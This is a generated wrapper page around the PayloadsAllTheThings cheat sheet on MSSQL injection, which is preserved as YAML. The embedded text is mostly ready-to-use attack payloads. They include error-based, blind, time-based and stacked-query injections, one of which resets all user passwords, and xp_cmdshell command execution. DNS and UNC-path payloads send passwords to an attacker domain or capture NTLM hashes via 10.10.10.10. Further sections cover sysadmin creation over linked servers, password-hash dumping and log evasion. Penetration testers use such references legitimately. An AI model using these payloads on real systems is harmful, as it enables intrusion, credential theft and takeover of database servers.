---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# MSSQL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-mssql-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/MSSQL Injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MSSQL Injection](../../topics/sql-injection/mssql-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-mssql-injection |
| name | MSSQL Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md |

## Preserved Source Material

````yaml
_body: "# MSSQL Injection\n\n> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert\
  \ or \"inject\" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens\
  \ when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can\
  \ lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database\
  \ server.\n\n## Summary\n\n* [MSSQL Default Databases](#mssql-default-databases)\n* [MSSQL Comments](#mssql-comments)\n\
  * [MSSQL Enumeration](#mssql-enumeration)\n    * [MSSQL List Databases](#mssql-list-databases)\n    * [MSSQL List Tables](#mssql-list-tables)\n\
  \    * [MSSQL List Columns](#mssql-list-columns)\n* [MSSQL Union Based](#mssql-union-based)\n* [MSSQL Error Based](#mssql-error-based)\n\
  * [MSSQL Blind Based](#mssql-blind-based)\n    * [MSSQL Blind With Substring Equivalent](#mssql-blind-with-substring-equivalent)\n\
  * [MSSQL Time Based](#mssql-time-based)\n* [MSSQL Stacked Query](#mssql-stacked-query)\n* [MSSQL File Manipulation](#mssql-file-manipulation)\n\
  \    * [MSSQL Read File](#mssql-read-file)\n    * [MSSQL Write File](#mssql-write-file)\n* [MSSQL Command Execution](#mssql-command-execution)\n\
  \    * [XP_CMDSHELL](#xp_cmdshell)\n    * [Python Script](#python-script)\n* [MSSQL Out of Band](#mssql-out-of-band)\n \
  \   * [MSSQL DNS Exfiltration](#mssql-dns-exfiltration)\n    * [MSSQL UNC Path](#mssql-unc-path)\n* [MSSQL Trusted Links](#mssql-trusted-links)\n\
  * [MSSQL Privileges](#mssql-privileges)\n    * [MSSQL List Permissions](#mssql-list-permissions)\n    * [MSSQL Make User\
  \ DBA](#mssql-make-user-dba)\n* [MSSQL Database Credentials](#mssql-database-credentials)\n* [MSSQL OPSEC](#mssql-opsec)\n\
  * [References](#references)\n\n## MSSQL Default Databases\n\n| Name                  | Description                     \
  \      |\n|-----------------------|---------------------------------------|\n| pubs                 | Not available on MSSQL\
  \ 2005           |\n| model                 | Available in all versions             |\n| msdb                 | Available\
  \ in all versions             |\n| tempdb             | Available in all versions             |\n| northwind           \
  \  | Available in all versions             |\n| information_schema | Available from MSSQL 2000 and higher  |\n\n## MSSQL\
  \ Comments\n\n| Type                       | Description                       |\n|----------------------------|-----------------------------------|\n\
  | `/* MSSQL Comment */`      | C-style comment                   |\n| `--`                       | SQL comment         \
  \              |\n| `;%00`                     | Null byte                         |\n\n## MSSQL Enumeration\n\n| Description\
  \     | SQL Query |\n| --------------- | ----------------------------------------- |\n| DBMS version    | `SELECT @@version`\
  \                        |\n| Database name   | `SELECT DB_NAME()`                        |\n| Database schema | `SELECT\
  \ SCHEMA_NAME()`                    |\n| Hostname        | `SELECT HOST_NAME()`                      |\n| Hostname     \
  \   | `SELECT @@hostname`                       |\n| Hostname        | `SELECT @@SERVERNAME`                     |\n| Hostname\
  \        | `SELECT SERVERPROPERTY('productversion')` |\n| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |\n\
  | Hostname        | `SELECT SERVERPROPERTY('edition')`        |\n| User            | `SELECT CURRENT_USER`             \
  \        |\n| User            | `SELECT user_name();`                     |\n| User            | `SELECT system_user;` \
  \                    |\n| User            | `SELECT user;`                            |\n\n### MSSQL List Databases\n\n\
  ```sql\nSELECT name FROM master..sysdatabases;\nSELECT name FROM master.sys.databases;\n\n-- for N = 0, 1, 2, …\nSELECT\
  \ DB_NAME(N); \n\n-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb \n-- (Only\
  \ works in MSSQL 2017+)\nSELECT STRING_AGG(name, ', ') FROM master..sysdatabases; \n```\n\n### MSSQL List Tables\n\n```sql\n\
  -- use xtype = 'V' for views\nSELECT name FROM master..sysobjects WHERE xtype = 'U';\nSELECT name FROM <DBNAME>..sysobjects\
  \ WHERE xtype='U'\nSELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';\n\n-- list column names and types for master..sometable\n\
  SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id\
  \ AND master..sysobjects.name='sometable';\n\nSELECT table_catalog, table_name FROM information_schema.columns\nSELECT table_name\
  \ FROM information_schema.tables WHERE table_catalog='<DBNAME>'\n\n-- Change delimiter value such as ', ' to anything else\
  \ you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor,\
  \ MSreplication_options  (Only works in MSSQL 2017+)\nSELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype\
  \ = 'U';\n```\n\n### MSSQL List Columns\n\n```sql\n-- for the current DB only\nSELECT name FROM syscolumns WHERE id = (SELECT\
  \ id FROM sysobjects WHERE name = 'mytable');\n\n-- list column names and types for master..sometable\nSELECT master..syscolumns.name,\
  \ TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id\
  \ AND master..sysobjects.name='sometable'; \n\nSELECT table_catalog, column_name FROM information_schema.columns\n\nSELECT\
  \ COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)\n```\n\n## MSSQL Union Based\n\n* Extract databases names\n\n  \
  \  ```sql\n    $ SELECT name FROM master..sysdatabases\n    [*] Injection\n    [*] msdb\n    [*] tempdb\n    ```\n\n* Extract\
  \ tables from Injection database\n\n    ```sql\n    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'\n    [*]\
  \ Profiles\n    [*] Roles\n    [*] Users\n    ```\n\n* Extract columns for the table Users\n\n    ```sql\n    $ SELECT name\
  \ FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')\n    [*] UserId\n    [*] UserName\n    ```\n\
  \n* Finally extract the data\n\n    ```sql\n    SELECT  UserId, UserName from Users\n    ```\n\n## MSSQL Error Based\n\n\
  | Name         | Payload         |\n| ------------ | --------------- |\n| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT\
  \ @@version)+'~')) -- -` |\n| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |\n| EQUAL       \
  \ | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |\n| CAST         | `CAST((SELECT @@version) AS INT)` |\n\n* For\
  \ integer inputs\n\n    ```sql\n    convert(int,@@version)\n    cast((SELECT @@version) as int)\n    ```\n\n* For string\
  \ inputs\n\n    ```sql\n    ' + convert(int,@@version) + '\n    ' + cast((SELECT @@version) as int) + '\n    ```\n\n## MSSQL\
  \ Blind Based\n\n```sql\nAND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -\n```\n\n```sql\nSELECT @@version WHERE @@version\
  \ LIKE '%12.0.2000.8%'\nWITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)\nSELECT message\
  \ FROM data WHERE row = 1 and message like 't%'\n```\n\n### MSSQL Blind With Substring Equivalent\n\n| Function    | Example\
  \                                         |\n| ----------- | ----------------------------------------------- |\n| `SUBSTRING`\
  \ | `SUBSTRING('foobar', <START>, <LENGTH>)`        |\n\nExamples:\n\n```sql\nAND ASCII(SUBSTRING(SELECT TOP 1 username\
  \ FROM tblusers),1,1)=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \nAND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables\
  \ > 'A'\nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90\n```\n\n## MSSQL Time Based\n\
  \nIn a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database\
  \ pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed\
  \ successfully or not.\n\n```sql\nProductID=1;waitfor delay '0:0:10'--\nProductID=1);waitfor delay '0:0:10'--\nProductID=1';waitfor\
  \ delay '0:0:10'--\nProductID=1');waitfor delay '0:0:10'--\nProductID=1));waitfor delay '0:0:10'--\n```\n\n```sql\nIF([INFERENCE])\
  \ WAITFOR DELAY '0:0:[SLEEPTIME]'\nIF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';\n```\n\n## MSSQL Stacked Query\n\
  \n* Stacked query without any statement terminator\n\n    ```sql\n    -- multiple SELECT statements\n    SELECT 'A'SELECT\
  \ 'B'SELECT 'C'\n\n    -- updating password with a stacked query\n    SELECT id, username, password FROM users WHERE username\
  \ = 'admin'exec('update[users]set[password]=''a''')--\n\n    -- using the stacked query to enable xp_cmdshell\n    -- you\
  \ won't have the output of the query, redirect it to a file \n    SELECT id, username, password FROM users WHERE username\
  \ = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--\n\
  \    ```\n\n* Use a semi-colon \"`;`\" to add another query\n\n    ```sql\n    ProductID=1; DROP members--\n    ```\n\n\
  ## MSSQL File Manipulation\n\n### MSSQL Read File\n\n**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS`\
  \ or the `ADMINISTER DATABASE BULK OPERATIONS` permission.\n\n```sql\nOPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB)\n\
  ```\n\nExample:\n\n```sql\n-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null\n\
  ```\n\n### MSSQL Write File\n\n```sql\nexecute spWriteStringToFile 'contents', 'C:\\path\\to\\', 'file'\n```\n\n## MSSQL\
  \ Command Execution\n\n### XP_CMDSHELL\n\n`xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows\
  \ you to run operating system commands directly from within T-SQL (Transact-SQL).\n\n```sql\nEXEC xp_cmdshell \"net user\"\
  ;\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n```\n\nIf you need to reactivate\
  \ `xp_cmdshell`, it is disabled by default in SQL Server 2005.\n\n```sql\n-- Enable advanced options\nEXEC sp_configure\
  \ 'show advanced options',1;\nRECONFIGURE;\n\n-- Enable xp_cmdshell\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n\
  ```\n\n### Python Script\n\n> Executed by a different user than the one using `xp_cmdshell` to execute commands\n\n```powershell\n\
  EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'\nEXECUTE\
  \ sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'\nEXECUTE sp_execute_external_script\
  \ @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'\n```\n\n## MSSQL\
  \ Out of Band\n\n### MSSQL DNS exfiltration\n\nTechnique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)\n\
  \n* **Permission**: Requires `VIEW SERVER STATE` permission on the server.\n\n    ```powershell\n    1 and exists(select\
  \ * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\\\
  1.xem',null,null))\n    ```\n\n* **Permission**: Requires the `CONTROL SERVER` permission.\n\n    ```powershell\n    1 (select\
  \ 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\\\
  ',default,default)))\n    1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\\\
  1.trc',default))\n    ```\n\n### MSSQL UNC Path\n\nMSSQL supports stacked queries so we can create a variable pointing to\
  \ our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.\n\n```sql\n\
  1'; use master; exec xp_dirtree '\\\\10.10.10.10\\SHARE';-- \n```\n\n```sql\nxp_dirtree '\\\\10.10.10.10\\file'\nxp_fileexist\
  \ '\\\\10.10.10.10\\file'\nBACKUP LOG [TESTING] TO DISK = '\\\\10.10.10.10\\file'\nBACKUP DATABASE [TESTING] TO DISK = '\\\
  \\10.10.10.10\\file'\nRESTORE LOG [TESTING] FROM DISK = '\\\\10.10.10.10\\file'\nRESTORE DATABASE [TESTING] FROM DISK =\
  \ '\\\\10.10.10.10\\file'\nRESTORE HEADERONLY FROM DISK = '\\\\10.10.10.10\\file'\nRESTORE FILELISTONLY FROM DISK = '\\\\\
  10.10.10.10\\file'\nRESTORE LABELONLY FROM DISK = '\\\\10.10.10.10\\file'\nRESTORE REWINDONLY FROM DISK = '\\\\10.10.10.10\\\
  file'\nRESTORE VERIFYONLY FROM DISK = '\\\\10.10.10.10\\file'\n```\n\n## MSSQL Trusted Links\n\nA trusted link in Microsoft\
  \ SQL Server is a linked server relationship that allows one SQL Server instance to execute queries and even remote procedures\
  \ on another server (or external OLE DB source) as if the remote server were part of the local environment. Linked servers\
  \ expose options that control whether remote procedures and RPC calls are allowed and what security context is used on the\
  \ remote server.\n\n> The links between databases work even across forest trusts.\n\n* Find links using `sysservers`: contains\
  \ one row for each server that an instance of SQL Server can access as an OLE DB data source.\n\n    ```sql\n    select\
  \ * from master..sysservers\n    ```\n\n* Execute query through the link\n\n    ```sql\n    select * from openquery(\"dcorp-sql1\"\
  , 'select * from master..sysservers')\n    select version from openquery(\"linkedserver\", 'select @@version as version')\n\
  \n    -- Chain multiple openquery\n    select version from openquery(\"link1\",'select version from openquery(\"link2\"\
  ,\"select @@version as version\")')\n    ```\n\n* Execute shell commands\n\n    ```sql\n    -- Enable xp_cmdshell and execute\
  \ \"dir\" command\n    EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\n    select 1 from openquery(\"\
  linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n\n    -- Create a SQL user and give sysadmin privileges\n\
  \    EXECUTE('EXECUTE(''CREATE LOGIN User WITH PASSWORD = ''''Password123'''' '') AT \"DOMAIN\\SQL01\"') AT \"DOMAIN\\SQL02\"\
  \n    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT \"DOMAIN\\SQL01\"') AT \"DOMAIN\\SQL02\"\
  \n    ```\n\n## MSSQL Privileges\n\n### MSSQL List Permissions\n\n* Listing effective permissions of current user on the\
  \ server.\n\n    ```sql\n    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); \n    ```\n\n* Listing effective permissions\
  \ of current user on the database.\n\n    ```sql\n    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');\n    ```\n\n*\
  \ Listing effective permissions of current user on a view.\n\n    ```sql\n    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer',\
  \ 'OBJECT') ORDER BY subentity_name, permission_name; \n    ```\n\n* Check if current user is a member of the specified\
  \ server role.\n\n    ```sql\n    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin,\
  \ diskadmin, public, processadmin\n    SELECT is_srvrolemember('sysadmin');\n    ```\n\n### MSSQL Make User DBA\n\n```sql\n\
  EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';\n```\n\n## MSSQL Database Credentials\n\n* **MSSQL 2000**: Hashcat\
  \ mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`\n\n    ```sql\n\
  \    SELECT name, password FROM master..sysxlogins\n    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins\
  \ \n    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer\n    ```\n\n\
  * **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`\n\n    ```sql\n    SELECT name,\
  \ password_hash FROM master.sys.sql_logins\n    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n\
  \    ```\n\n## MSSQL OPSEC\n\nUse `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`\n\n```sql\n\
  -- 'sp_password' was found in the text of this event.\n-- The text has been replaced with this comment for security reasons.\n\
  ```\n\n## References\n\n* [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc\
  \ Olivier Bergeron - June 21, 2023](https://web.archive.org/web/20240219205617/https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)\n\
  * [Error based SQL Injection in \"Order By\" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)\n\
  * [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://web.archive.org/web/20260222213546/https://www.exploit-db.com/papers/12975)\n\
  * [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://web.archive.org/web/20220906233249/https://docs.microsoft.com/en-us/SQL/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)\n\
  * [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](https://web.archive.org/web/20260214013447/https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)\n\
  * [MSSQL Trusted Links - HackTricks - September 15, 2024](https://web.archive.org/web/20241126085555/https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)\n\
  * [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://web.archive.org/web/20210227063841/https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)\n\
  * [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://web.archive.org/web/20220907211545/https://docs.microsoft.com/en-us/SQL/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)"
_relative_path: SQL Injection/MSSQL Injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/MSSQL Injection.md
````
